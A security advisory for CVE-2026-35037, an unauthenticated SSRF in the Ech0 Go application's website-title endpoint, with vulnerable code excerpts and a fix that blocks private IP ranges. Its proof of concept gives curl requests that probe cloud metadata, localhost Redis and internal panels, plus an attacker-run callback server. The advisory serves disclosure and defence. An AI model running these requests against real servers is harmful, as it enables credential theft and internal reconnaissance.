# [H] Ech0: Unauthenticated SSRF in GetWebsiteTitle allows access to internal services and cloud metadata

## Summary
Severity: High
Advisory: GHSA-cqgf-f4x7-g6wc
CVE: CVE-2026-35037
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-cqgf-f4x7-g6wc
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <1.4.8-0.20260401031029-4ca56fea5ba4

## Details
## Summary

The `GET /api/website/title` endpoint accepts an arbitrary URL via the `website_url` query parameter and makes a server-side HTTP request to it without any validation of the target host or IP address. The endpoint requires no authentication. An attacker can use this to reach internal network services, cloud metadata endpoints (169.254.169.254), and localhost-bound services, with partial response data exfiltrated via the HTML `<title>` tag extraction.

## Details

The vulnerability exists in the interaction between four components:

**1. Route registration — no authentication** (`internal/router/common.go:11`):
```go
appRouterGroup.PublicRouterGroup.GET("/website/title", h.CommonHandler.GetWebsiteTitle())
```
The `PublicRouterGroup` is created at `internal/router/router.go:34` as `r.Group("/api")` with no auth middleware attached (unlike `AuthRouterGroup` which uses `JWTAuthMiddleware`).

**2. Handler — no input validation** (`internal/handler/common/common.go:106-127`):
```go
func (commonHandler *CommonHandler) GetWebsiteTitle() gin.HandlerFunc {
    return res.Execute(func(ctx *gin.Context) res.Response {
        var dto commonModel.GetWebsiteTitleDto
        if err := ctx.ShouldBindQuery(&dto); err != nil { ... }
        title, err := commonHandler.commonService.GetWebsiteTitle(dto.WebSiteURL)
        ...
    })
}
```
The DTO (`internal/model/common/common_dto.go:155-156`) only enforces `binding:"required"` — no URL scheme or host validation.

**3. Service — TrimURL is cosmetic** (`internal/service/common/common.go:122-125`):
```go
func (s *CommonService) GetWebsiteTitle(websiteURL string) (string, error) {
    websiteURL = httpUtil.TrimURL(websiteURL)
    body, err := httpUtil.SendRequest(websiteURL, "GET", httpUtil.Header{}, 10*time.Second)
    ...
}
```
`TrimURL` (`internal/util/http/http.go:16-26`) only calls `TrimSpace`, `TrimPrefix("/")`, and `TrimSuffix("/")`. No SSRF protections.

**4. HTTP client — unrestricted outbound request** (`internal/util/http/http.go:53-84`):
```go
client := &http.Client{
    Timeout: clientTimeout,
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
        },
    },
}
req, err := http.NewRequest(method, url, nil)
...
resp, err := client.Do(req)
```
The client follows redirects (Go default), skips TLS verification, and has no restrictions on target IP ranges.

The response body is parsed for `<title>` tags and the extracted title is returned to the attacker, providing a data exfiltration channel for any response containing HTML title elements.

## PoC

**Step 1: Probe cloud metadata endpoint (AWS)**
```bash
curl -s 'http://localhost:8080/api/website/title?website_url=http://169.254.169.254/latest/meta-data/'
```
If the Ech0 instance runs on AWS EC2, the server will make a request to the instance metadata service. While the metadata response is not HTML, this confirms network reachability.

**Step 2: Probe internal localhost services**
```bash
curl -s 'http://localhost:8080/api/website/title?website_url=http://127.0.0.1:6379/'
```
Probes for Redis on localhost. Connection success/failure and error messages reveal internal service topology.

**Step 3: Exfiltrate data from internal web services with HTML title tags**
```bash
curl -s 'http://localhost:8080/api/website/title?website_url=http://internal-admin-panel.local/'
```
If the internal service returns an HTML page with a `<title>` tag, its content is returned to the attacker.

**Step 4: Confirm with a controlled external server**
```bash
# On attacker machine:
python3 -c "from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()
        self.wfile.write(b'<html><head><title>SSRF-CONFIRMED</title></head></html>')
HTTPServer(('0.0.0.0',9999),H).serve_forever()" &

# From any client:
curl -s 'http://<ech0-host>:8080/api/website/title?website_url=http://<attacker-ip>:9999/'
```
Expected response contains `"data":"SSRF-CONFIRMED"`, proving the server made an outbound request to the attacker-controlled URL.

## Impact

- **Cloud credential theft**: An attacker can reach cloud metadata services (AWS IMDSv1 at `169.254.169.254`, GCP, Azure) to steal IAM credentials, API tokens, and instance configuration data.
- **Internal network reconnaissance**: Port scanning and service discovery of internal hosts that are not directly accessible from the internet.
- **Localhost service interaction**: Access to services bound to `127.0.0.1` (databases, caches, admin panels) that rely on network-level isolation for security.
- **Firewall bypass**: The server acts as a proxy, allowing attackers to bypass network ACLs and reach otherwise-protected internal infrastructure.
- **Data exfiltration**: Partial response content is leaked through the `<title>` tag extraction. While limited, this is sufficient to extract sensitive data from services that return HTML responses.

The attack requires no authentication and can be performed by any anonymous internet user with network access to the Ech0 instance.

## Recommended Fix

Add URL validation in `GetWebsiteTitle` to block requests to private/reserved IP ranges and restrict allowed schemes. In `internal/service/common/common.go`:

```go
import (
    "net"
    "net/url"
)

func isPrivateIP(ip net.IP) bool {
    privateRanges := []string{
        "127.0.0.0/8",
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "169.254.0.0/16",
        "::1/128",
        "fc00::/7",
        "fe80::/10",
    }
    for _, cidr := range privateRanges {
        _, network, _ := net.ParseCIDR(cidr)
        if network.Contains(ip) {
            return true
        }
    }
    return false
}

func (s *CommonService) GetWebsiteTitle(websiteURL string) (string, error) {
    websiteURL = httpUtil.TrimURL(websiteURL)

    // Validate URL scheme
    parsed, err := url.Parse(websiteURL)
    if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
        return "", errors.New("only http and https URLs are allowed")
    }

    // Resolve hostname and block private IPs
    host := parsed.Hostname()
    ips, err := net.LookupIP(host)
    if err != nil {
        return "", fmt.Errorf("failed to resolve hostname: %w", err)
    }
    for _, ip := range ips {
        if isPrivateIP(ip) {
            return "", errors.New("requests to private/internal addresses are not allowed")
        }
    }

    body, err := httpUtil.SendRequest(websiteURL, "GET", httpUtil.Header{}, 10*time.Second)
    // ... rest unchanged
}
```

Additionally, consider:
1. Removing `InsecureSkipVerify: true` from `SendRequest` in `internal/util/http/http.go:69`
2. Disabling redirect following in the HTTP client (`CheckRedirect` returning `http.ErrUseLastResponse`) or re-validating the target IP after each redirect to prevent DNS rebinding
3. Adding rate limiting to this endpoint

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-cqgf-f4x7-g6wc
- https://nvd.nist.gov/vuln/detail/CVE-2026-35037
- https://github.com/lin-snow/Ech0
